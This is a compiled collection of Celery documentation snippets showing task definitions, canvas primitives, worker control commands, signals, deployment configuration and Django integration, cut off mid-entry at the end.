Implementing JSON Serialization for Custom Types in Python\nDESCRIPTION: Example class demonstrating how to implement the __json__ method for custom types to make them serializable with Celery's JSON serializer. This allows complex objects to be reduced to built-in JSON types.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nclass Person:\n    first_name = None\n    last_name = None\n    address = None\n\n    def __json__(self):\n        return {\n            'first_name': self.first_name,\n            'last_name': self.last_name,\n            'address': self.address,\n        }\n```\n\n----------------------------------------\n\nTITLE: Creating Celery Tasks from Methods using contrib.methods in Python\nDESCRIPTION: Demonstrates the experimental `celery.contrib.methods` feature for defining Celery tasks directly from object methods. It uses the `@celery.task` decorator with `filter=task_method` on the `increment` method of the `Counter` class. This allows the method to be called as a task named `Counter.increment` while automatically receiving the instance (`self`) as its first argument. Requires `celery.contrib.methods.task_method` and a Celery app instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_33\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.contrib.methods import task_method\n\nclass Counter(object):\n\n    def __init__(self):\n        self.value = 1\n\n    @celery.task(name='Counter.increment', filter=task_method)\n    def increment(self, n=1):\n        self.value += 1\n        return self.value\n```\n\n----------------------------------------\n\nTITLE: Purging All Configured Celery Task Queues\nDESCRIPTION: Removes all messages from all task queues configured in the Celery application's settings (e.g., `CELERY_QUEUES`). This is a destructive operation and cannot be undone. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj purge\n```\n\n----------------------------------------\n\nTITLE: Task Result Handling in Celery\nDESCRIPTION: Examples showing how to enable or disable result storage for Celery tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\n>>> result = add.apply_async((1, 2), ignore_result=True)\n>>> result.get()\nNone\n\n>>> # Do not ignore result (default)\n...\n>>> result = add.apply_async((1, 2), ignore_result=False)\n>>> result.get()\n3\n```\n\n----------------------------------------\n\nTITLE: Running Multiple Celery Tasks Concurrently with Group (Python)\nDESCRIPTION: This Python snippet shows how to execute multiple `urlopen` tasks concurrently using a Celery `group` from an interactive Python session within the `examples/gevent` directory. It creates task signatures for each URL in a predefined `LIST_OF_URLS`, groups them, and submits the group for asynchronous execution. The code then iterates through the results as they arrive using `result.iter_native()`. Requires `LIST_OF_URLS` to be defined and an active Celery worker.\nSOURCE: https://github.com/celery/celery/blob/main/examples/gevent/README.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n# Run from: $ cd examples/gevent\n#           $ python\n>>> from tasks import urlopen\n>>> from celery import group\n>>> result = group(urlopen.s(url)\n...                     for url in LIST_OF_URLS).apply_async()\n>>> for incoming_result in result.iter_native():\n...     print(incoming_result)\n```\n\n----------------------------------------\n\nTITLE: Broadcasting Asynchronous Celery Control Commands (Python)\nDESCRIPTION: Illustrates sending an asynchronous remote control command ('rate_limit') to Celery workers using `app.control.broadcast`. The command includes arguments to specify the task name and the desired rate limit. No reply is requested, so the call returns immediately without waiting for worker responses.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n>>> app.control.broadcast('rate_limit',\n...                          arguments={'task_name': 'myapp.mytask',\n...                                     'rate_limit': '200/m'})\n```\n\n----------------------------------------\n\nTITLE: Installing Celery Helm Chart on Kubernetes - Shell\nDESCRIPTION: This code snippet provides the shell command to install the Celery Helm chart into a Kubernetes cluster from the project root. It uses the helm CLI tool to deploy the chart found in the helm-chart directory. The core parameter is the release name (celery) and the chart directory; no additional values files are specified by default. Assumes Helm is installed and cluster context is set.\nSOURCE: https://github.com/celery/celery/blob/main/helm-chart/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nhelm install celery helm-chart/\n```\n\n----------------------------------------\n\nTITLE: Cleaning Resources Before Process Forking via worker_before_create_process Signal in Python\nDESCRIPTION: This snippet illustrates connecting a function (`clean_channels`) to the `worker_before_create_process` signal. This signal is dispatched in the parent worker process just before a new child process is created in the prefork pool. The handler function is used here to call `grpc_singleton.clean_channel()`, likely to clean up or close gRPC channels or other resources that might not behave well when duplicated across forked processes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n.. code-block:: python\n\n    @signals.worker_before_create_process.connect\n    def clean_channels(**kwargs):\n        grpc_singleton.clean_channel()\n```\n\n----------------------------------------\n\nTITLE: Redis Unix Socket Connection Format\nDESCRIPTION: URL format for connecting to Redis via Unix socket\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nredis+socket:///path/to/redis.sock\n```\n\n----------------------------------------\n\nTITLE: Defining Abstract Celery Task Base Class in Python\nDESCRIPTION: Defines an abstract Celery Task `DebugTask` which is not bound to an app until subclassed. It overrides the `__call__` method to add custom behavior (printing a debug message) before executing the task's `run` method. This demonstrates the lazy binding feature introduced in Celery 3.0. Requires the `celery` library.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.task import Task\n\nclass DebugTask(Task):\n    abstract = True\n\n    def __call__(self, *args, **kwargs):\n        print('CALLING %r' % (self,))\n        return self.run(*args, **kwargs)\n```\n\n----------------------------------------\n\nTITLE: Raising Ignore Exception in Celery Tasks (Python)\nDESCRIPTION: This snippet illustrates how to skip updating the state or emitting events after a task returns by raising celery.exceptions.Ignore within a custom task. It requires the celery.exceptions module and a configured task environment with a Redis backend. The redis.sismember check inspects whether the current task’s ID is present in a revocation set, raising Ignore if it is. The function takes no parameters, expects to be used as a Celery task, and will immediately abort state updates if conditions are met. This behavior helps avoid side-effects from revoked task executions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.exceptions import Ignore\\n\\n@task\\ndef custom_revokes():\\n    if redis.sismember('tasks.revoked', custom_revokes.request.id):\\n        raise Ignore()\n```\n\n----------------------------------------\n\nTITLE: Using on_commit for Safe Task Execution in Older Celery Versions\nDESCRIPTION: This snippet shows how to use Django's on_commit callback to safely execute a Celery task after a transaction commit in versions of Celery prior to 5.4.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_51\n\nLANGUAGE: python\nCODE:\n```\nimport functools\nfrom django.db import transaction\nfrom django.http import HttpResponseRedirect\n\n@transaction.atomic\ndef create_article(request):\n    article = Article.objects.create()\n    transaction.on_commit(\n        functools.partial(expand_abbreviations.delay, article.pk)\n    )\n    return HttpResponseRedirect('/articles/')\n```\n\n----------------------------------------\n\nTITLE: Running Django Setup and Server for Celery Gateway - Shell\nDESCRIPTION: This snippet provides the commands to initialize the Django database (if required) and launch the development server, enabling the Celery HTTP gateway. It requires Django and Celery to be installed and configured with proper broker settings. Inputs are shell commands, and outputs are the running Django service listening for task requests on localhost.\nSOURCE: https://github.com/celery/celery/blob/main/examples/celery_http_gateway/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ python manage.py syncdb # (if running the database backend)\n\n$ python manage.py runserver\n```\n\n----------------------------------------\n\nTITLE: Defining systemd Service for Celery Beat Scheduler - Bash\nDESCRIPTION: Provides a sample systemd service file to run Celery Beat as a managed service. The file configures environment, directories, user/group, and the command line for Beat, relying on variables set in an external conf.d file. Place in /etc/systemd/system/celerybeat.service. Prerequisites: systemd, Celery Beat, configured environment file. Outputs: continuously running Celery Beat scheduler as systemd service.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n[Unit]\nDescription=Celery Beat Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=celery\nGroup=celery\nEnvironmentFile=/etc/conf.d/celery\nWorkingDirectory=/opt/celery\nExecStart=/bin/sh -c '${CELERY_BIN} -A ${CELERY_APP} beat  \\\n    --pidfile=${CELERYBEAT_PID_FILE} \\\n    --logfile=${CELERYBEAT_LOG_FILE} --loglevel=${CELERYD_LOG_LEVEL}'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n```\n\n----------------------------------------\n\nTITLE: Example Log Output: Warm -> Soft -> Hard Shutdown Transition (Console)\nDESCRIPTION: Shows the console log output as a Celery worker transitions through shutdown stages initiated by repeated Ctrl+C (SIGINT) signals. The sequence demonstrated is Warm shutdown -> Soft shutdown (with a 10-second timeout) -> Hard shutdown (immediate termination triggered by the third Ctrl+C).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n[INFO/MainProcess] Task myapp.long_running_task[7235ac16-543d-4fd5-a9e1-2d2bb8ab630a] received\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 1/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 2/2000s\n^C\nworker: Hitting Ctrl+C again will initiate cold shutdown, terminating all running tasks!\n\nworker: Warm shutdown (MainProcess)\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 3/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 4/2000s\n^C\nworker: Hitting Ctrl+C again will terminate all running tasks!\n[WARNING/MainProcess] Initiating Soft Shutdown, terminating in 10 seconds\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 5/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 6/2000s\n^C\n```\n\n----------------------------------------\n\nTITLE: Using the Celery chunks Primitive in Python\nDESCRIPTION: Demonstrates the `chunks` primitive, which splits a large iterable of arguments into smaller chunks to be processed by multiple task invocations. Here, 1000 items are split into chunks of 10, resulting in 100 separate `add` task calls.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_23\n\nLANGUAGE: pycon\nCODE:\n```\n>>> items = zip(range(1000), range(1000))  # 1000 items\n>>> add.chunks(items, 10)\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery to Accept Only JSON Serialized Messages in Python\nDESCRIPTION: A security configuration to restrict Celery to only accept JSON serialized messages, addressing the CELERYSA-0003 vulnerability in Celery 4.0.0.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\napp.conf.accept_content = ['json']\n```\n\n----------------------------------------\n\nTITLE: Task Priority Inheritance for Parent-Child Tasks\nDESCRIPTION: Example showing how child tasks inherit priority from their parent tasks when task_inherit_parent_priority is enabled. Demonstrates priority propagation from parent to child tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.3.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef child_task(self):\n    pass\n\n@app.task(bind=True)\ndef parent_task(self):\n    child_task.delay()\n\n# child_task will also have priority=5\nparent_task.apply_async(args=[], priority=5)\n```\n\n----------------------------------------\n\nTITLE: Accessing the Automatically Generated Name of a Celery Task in Python (pycon)\nDESCRIPTION: Demonstrates accessing the `.name` attribute of a task defined with the `@app.task` decorator without an explicit `name` argument. The name is automatically generated based on the module and function name, shown here within a Python console session (`pycon`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_9\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.name\n'tasks.add'\n```\n\n----------------------------------------\n\nTITLE: Advanced Worker Queue Configuration\nDESCRIPTION: Example of starting multiple workers with different queue assignments.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ celery multi start 10 -A proj -l INFO -Q:1-3 images,video -Q:4,5 data \\\n    -Q default -L:4,5 debug\n```\n\n----------------------------------------\n\nTITLE: Django Celery Task with delay_on_commit\nDESCRIPTION: Using the new DjangoTask delay_on_commit method for transaction-safe task execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n- send_email.delay(user.pk)\n+ send_email.delay_on_commit(user.pk)\n```\n\n----------------------------------------\n\nTITLE: Setting Timezone for Celery Scheduler in Python\nDESCRIPTION: This snippet demonstrates how to set the timezone for the Celery scheduler globally within your Celery configuration. The `timezone` variable can be directly assigned (as shown) or set via the application's configuration object. Changing the timezone will alter when periodic tasks are scheduled, and requires compatible schedulers for automatic updates. This approach is dependency-free except for Celery itself; users must ensure third-party schedulers react properly to time zone changes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\ntimezone = 'Europe/London'\n```\n\n----------------------------------------\n\nTITLE: Final Routing Options After Merging in Celery\nDESCRIPTION: Shows the final routing options that result from merging task_queues and task_routes settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_43\n\nLANGUAGE: javascript\nCODE:\n```\n{'exchange': 'cpubound',\n 'routing_key': 'tasks.add',\n 'serializer': 'json'}\n```\n\n----------------------------------------\n\nTITLE: Purging Specific Celery Task Queues\nDESCRIPTION: Removes messages only from the specified task queues (`celery`, `foo`, `bar`). Use the `-Q` option followed by a comma-separated list of queue names. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj purge -Q celery,foo,bar\n```\n\n----------------------------------------\n\nTITLE: Retrieving Task Results with Gevent/Eventlet Consumer Threads - Python\nDESCRIPTION: Illustrates how to use Celery result objects in gevent or eventlet environments, where a dedicated thread will consume results in the background. Shows how obtaining a result via 'result.get(timeout=3)' will leverage the consumer thread, improving performance when multiple coroutines are retrieving results. Requires Celery, gevent/eventlet, and a properly configured asynchronous environment.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nresult = add.delay(2, 2)\\n\\n# this call will delegate to the result consumer thread:\\n#   once the consumer thread has received the result this greenlet can\\n# continue.\\nvalue = result.get(timeout=3)\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with SQS Support via pip\nDESCRIPTION: Command to install Celery with Amazon SQS dependencies using pip and the sqs bundle option.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/sqs.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pip install \"celery[sqs]\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Task Headers in Celery Task Requests - Python\nDESCRIPTION: Demonstrates how to define a Celery task that reads custom headers from the task request, useful for passing metadata out-of-band via the headers dictionary. Assumes an app variable exists and Celery is installed. The example binds the task to access self.request.headers, showing both definition and invocation. Input: custom headers on apply_async; Output: value extracted from headers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef t(self):\n    return self.request.headers.get('sender')\n\n>>> t.apply_async(headers={'sender': 'George Costanza'})\n```\n\n----------------------------------------\n\nTITLE: Celery Worker Node Configuration in Bash\nDESCRIPTION: Demonstrates how to configure multiple Celery worker nodes with specific application options using environment variables\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nCELERYD_NODES=\"X1 X2 Y1 Y2\"\nCELERYD_OPTS=\"-A:X1 x -A:X2 x -A:Y1 y -A:Y2 y\"\n```\n\n----------------------------------------\n\nTITLE: Using Pipe Operator for Chains in Celery Python\nDESCRIPTION: Shows how to create a chain of tasks using the | (pipe) operator in Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_43\n\nLANGUAGE: python\nCODE:\n```\n>>> (add.s(2, 2) | mul.s(8) | mul.s(10)).apply_async()\n```\n\n----------------------------------------\n\nTITLE: Configuring Logging with stdout Redirection in Celery\nDESCRIPTION: Example showing how to configure logging with manual stdout redirection in Celery, including setting up custom logger and redirecting standard outputs.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom logging.config import fileConfig\nfrom celery import log\n\ndef setup_logging(**kwargs):\n    import logging\n    fileConfig('logging.conf')\n    stdouts = logging.getLogger('mystdoutslogger')\n    log.redirect_stdouts_to_logger(stdouts, loglevel=logging.WARNING)\n```\n\n----------------------------------------\n\nTITLE: Adjusting Worker Pool Size Programmatically in Celery\nDESCRIPTION: Shows how to dynamically grow or shrink the worker process pool programmatically using remote control commands to adjust to changing workloads.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_13\n\nLANGUAGE: pycon\nCODE:\n```\n>>> celery.control.pool_grow(2, destination=['w1.example.com'])\n>>> celery.control.pool_shrink(2, destination=['w1.example.com'])\n```\n\n----------------------------------------\n\nTITLE: Using Classes for Conditional Task Annotations in Celery (Python)\nDESCRIPTION: Shows a more advanced usage of `task_annotations` by employing a class (`MyAnnotate`) with an `annotate` method. This method allows for conditional logic (e.g., checking `task.name`) to determine which annotations to apply, offering greater flexibility than static dictionaries for complex scenarios. The setting accepts a tuple or list of such annotation objects or dictionaries.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nclass MyAnnotate:\n\n    def annotate(self, task):\n        if task.name.startswith('tasks.'):\n            return {'rate_limit': '10/s'}\n\ntask_annotations = (MyAnnotate(), {other,})\n```\n\n----------------------------------------\n\nTITLE: Registering SQLAlchemy Engine Cleanup after Fork - Python\nDESCRIPTION: Demonstrates registering an SQLAlchemy engine's dispose method to run automatically after a process fork in a Celery worker, ensuring that sqlalchemy connections are cleaned up per forked worker process. Requires SQLAlchemy and Python's multiprocessing.util. The snippet sets up an engine, then uses register_after_fork to call engine.dispose in new processes. Input: engine creation arguments; Output: cleaned engine after forks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nfrom multiprocessing.util import register_after_fork\n\nengine = create_engine(*engine_args)\nregister_after_fork(engine, engine.dispose)\n```\n\n----------------------------------------\n\nTITLE: Enabling REMAP_SIGTERM Feature in Bash\nDESCRIPTION: This code sets an environment variable to enable the REMAP_SIGTERM feature in Celery. It remaps the SIGTERM signal to SIGQUIT, allowing for soft or cold shutdown using TERM instead of QUIT.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.5.rst#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nexport REMAP_SIGTERM=\"SIGQUIT\"\n```\n\n----------------------------------------\n\nTITLE: Inspecting Revoked Celery Tasks History\nDESCRIPTION: Lists the IDs of tasks that have been revoked by workers in the cluster. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_10\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect revoked\n```\n\n----------------------------------------\n\nTITLE: Querying Specific Celery Task Information by ID\nDESCRIPTION: Retrieves detailed status and information about a specific task identified by its UUID from any worker that might be processing or holding it. Requires the Celery application instance (`-A proj`) and the task ID.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_13\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect query_task e9f6c8f0-fec9-4ae8-a8c6-cf8c8451d4f8\n```\n\n----------------------------------------\n\nTITLE: Filtering Celery Signal Handlers by Task Name in Python\nDESCRIPTION: This code demonstrates how to connect a handler to the after_task_publish signal for a specific task, filtering using the sender argument (the name of the task). The decorated function will only be triggered when the task named 'proj.tasks.add' is published. As with the previous example, task context is extracted from headers or body. This approach is useful when custom behavior is needed for specific tasks, and allows for fine-grained control over signal handler invocations based on the task name.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n@after_task_publish.connect(sender='proj.tasks.add')\ndef task_sent_handler(sender=None, headers=None, body=None, **kwargs):\n    # information about task are located in headers for task messages\n    # using the task protocol version 2.\n    info = headers if 'task' in headers else body\n    print('after_task_publish for task id {info[id]}'.format(\n        info=info,\n    ))\n\n```\n\n----------------------------------------\n\nTITLE: Overriding Celery Configuration for a Pytest Test Class\nDESCRIPTION: Demonstrates applying the `@pytest.mark.celery` marker at the class level. This overrides the specified Celery configuration (e.g., `result_backend='redis://'`) for all test methods within the `test_something` class.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n@pytest.mark.celery(result_backend='redis://')\nclass test_something:\n\n    def test_one(self):\n        ...\n\n    def test_two(self):\n        ...\n```\n\n----------------------------------------\n\nTITLE: Instantiating a Celery Application with a Specific Main Name in Python Interactive Shell\nDESCRIPTION: Demonstrates specifying an alternate main module name during Celery app instantiation, thereby controlling the prefix used for associated task names. Dependencies: Celery must be installed and accessible; this is an interactive workflow. Highlights the impact on app.main and task name attributes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_4\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app = Celery('tasks')\n>>> app.main\n'tasks'\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add.name\ntasks.add\n```\n\n----------------------------------------\n\nTITLE: Defining a Celery Task Group in Python REPL\nDESCRIPTION: Shows how to create a Celery `group` object containing multiple task signatures. This example creates a group `g` of ten `add.s(i, i)` tasks, where `i` ranges from 0 to 9. This group can then be manipulated or applied collectively. Requires a Celery task (e.g., `add`) and `celery.group`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_30\n\nLANGUAGE: pycon\nCODE:\n```\n>>> g = group(add.s(i, i) for i in xrange(10))\n```\n\n----------------------------------------\n\nTITLE: Sending Tasks Directly to Transient Queue via apply_async (Python)\nDESCRIPTION: This snippet illustrates how to send a Celery task to a specific transient queue using the apply_async method. It assumes that a task object and the corresponding queue ('transient') are already defined in the Celery configuration. Inputs are the task arguments and the queue parameter; output is the task sent to the designated queue, bypassing the default persistent queue to gain performance benefits.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/optimizing.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\ntask.apply_async(args, queue='transient')\\n\n```\n\n----------------------------------------\n\nTITLE: Defining a Celery Task with Database Interaction in Python\nDESCRIPTION: Defines a bound Celery task named `send_order`. The task retrieves a `Product` object using its primary key, converts the price string to a Decimal, calls the `order` method on the product, and implements retry logic using `self.retry` if an `OperationalError` occurs. Being a bound task, `self` refers to the task instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom .models import Product\n\n\n@app.task(bind=True)\ndef send_order(self, product_pk, quantity, price):\n    price = Decimal(price)  # json serializes this to string.\n\n    # models are passed by id, not serialized.\n    product = Product.objects.get(product_pk)\n\n    try:\n        product.order(quantity, price)\n    except OperationalError as exc:\n        raise self.retry(exc=exc)\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Annotation Class for Celery Tasks in Python\nDESCRIPTION: Defines a custom annotation class that filters tasks based on their name and applies a rate limit. This provides more flexibility in task annotation compared to using a simple dictionary.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nclass MyAnnotate(object):\n\n    def annotate(self, task):\n        if task.name.startswith('tasks.'):\n            return {'rate_limit': '10/s'}\n\nCELERY_ANNOTATIONS = (MyAnnotate(), {other_annotations,})\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Result Backend Global Key Prefix in Python\nDESCRIPTION: Example of configuring the new global_keyprefix feature for the Redis result backend in Celery 5.3, which prepends the specified prefix to all keys used for the result backend, useful when a Redis database is shared by different users.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.3.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\napp.conf.result_backend_transport_options = {\n    'global_keyprefix': 'my_prefix_'\n}\n```\n\n----------------------------------------\n\nTITLE: Installing django-celery-beat Package via pip\nDESCRIPTION: Command for installing the django-celery-beat package using pip, which enables periodic task management in Django's admin interface.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_16\n\nLANGUAGE: console\nCODE:\n```\n$ pip install django-celery-beat\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Worker PID and Log Files\nDESCRIPTION: Shows how to start multiple workers with custom PID and log file locations using format strings. The %n placeholder is replaced with the worker node name.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start jerry elaine george kramer \\\n                        --logfile=/var/log/celeryd@%n.log \\\n                        --pidfile=/var/run/celeryd@%n.pid\n```\n\n----------------------------------------\n\nTITLE: Enabling Celery SIGTERM Remapping Feature\nDESCRIPTION: The `REMAP_SIGTERM` feature allows the standard SIGTERM signal to trigger the same behavior as SIGQUIT (which normally initiates a soft or cold shutdown in Celery). This setting enables users to use SIGTERM for graceful shutdowns.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_6\n\nLANGUAGE: Identifier\nCODE:\n```\nREMAP_SIGTERM\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with Eventlet Support\nDESCRIPTION: Command to install Celery with Eventlet worker pool support. Requires eventlet>=0.24.1.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.3.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pip install -U celery[eventlet]\n```\n\n----------------------------------------\n\nTITLE: Accessing Child Tasks in Celery Python\nDESCRIPTION: Demonstrates how to access and retrieve results from child tasks that were called by the original task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\n>>> res.children\n[<AsyncResult: 8c350acf-519d-4553-8a53-4ad3a5c5aeb4>]\n\n>>> res.children[0].get()\n64\n```\n\n----------------------------------------\n\nTITLE: Interactive Shortcut for Synchronous Signature Execution in Python\nDESCRIPTION: Explains the tilde (`~`) prefix operator as a shortcut available in the Python shell for executing a signature asynchronously and immediately waiting for its result. `~sig` is equivalent to `sig.delay().get()`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_17\n\nLANGUAGE: pycon\nCODE:\n```\n>>> ~sig\n\n>>> # is the same as\n>>> sig.delay().get()\n```\n\n----------------------------------------\n\nTITLE: Adding and Handling Custom Celery Command-Line Options in Python\nDESCRIPTION: This snippet demonstrates how to add a custom command-line option (`--monitoring`) to the Celery command-line interface using `app.user_options['preload']`. It then shows how to handle this custom option by connecting a function (`handle_preload_options`) to the `user_preload_options` signal. This signal is triggered after user preload options are parsed, allowing the handler to check the value of the custom option (`options['monitoring']`) and execute corresponding logic (`enable_monitoring()`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n.. code-block:: python\n\n    from celery import Celery\n    from celery import signals\n    from celery.bin.base import Option\n\n    app = Celery()\n    app.user_options['preload'].add(Option(\n        '--monitoring', action='store_true',\n        help='Enable our external monitoring utility, blahblah',\n    ))\n\n    @signals.user_preload_options.connect\n    def handle_preload_options(options, **kwargs):\n        if options['monitoring']:\n            enable_monitoring()\n```\n\n----------------------------------------\n\nTITLE: Applying Multiple Decorators to a Celery Task in Python\nDESCRIPTION: Demonstrates the correct order for applying multiple decorators to a function that is also a Celery task. The `@app.task` decorator must appear first in the list (meaning it's applied last). Assumes `app`, `decorator1`, and `decorator2` are defined elsewhere.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n@app.task\n@decorator2\n@decorator1\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Configuring Tasks for Use in Celery Chords\nDESCRIPTION: Shows how to configure tasks to not ignore results, which is required for tasks used in chords, using both task subclass and decorator approaches.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_57\n\nLANGUAGE: python\nCODE:\n```\nclass MyTask(Task):\n    ignore_result = False\n```\n\nLANGUAGE: python\nCODE:\n```\n@app.task(ignore_result=False)\ndef another_task(project):\n    do_something()\n```\n\n----------------------------------------\n\nTITLE: Installing Requirements with pip (Bash)\nDESCRIPTION: Demonstrates the use of pip to install core project dependencies from the requirements/default.txt file. Requires Python and pip to be pre-installed. The -U 